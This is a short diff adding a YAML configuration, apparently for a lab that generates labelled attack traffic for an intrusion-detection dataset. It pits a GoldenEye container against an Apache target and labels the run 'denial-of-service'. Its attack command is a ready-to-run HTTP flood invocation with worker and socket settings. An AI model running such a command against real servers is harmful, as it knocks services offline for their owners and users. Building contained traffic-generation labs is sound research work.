@@ -1,0 +1,19 @@
+attacker:
+  name: goldeneye
+  image: ghcr.io/simonhondekyn/goldeneye:cic
+  atkCommand: python goldeneye.py http://$TARGET_IP:80/ -w 10 -s 500
+  atkTime: 283s
+  cpuLimit: 1000m
+target:
+  name: apache
+  image: ghcr.io/simonhondekyn/apache-low-workers:cic
+  startupProbe:
+    httpGet:
+      path: /
+      port: 80
+    initialDelaySeconds: 15
+    periodSeconds: 5
+labels:
+  label: 1
+  category: "denial-of-service"
+  subcategory: "goldeneye"
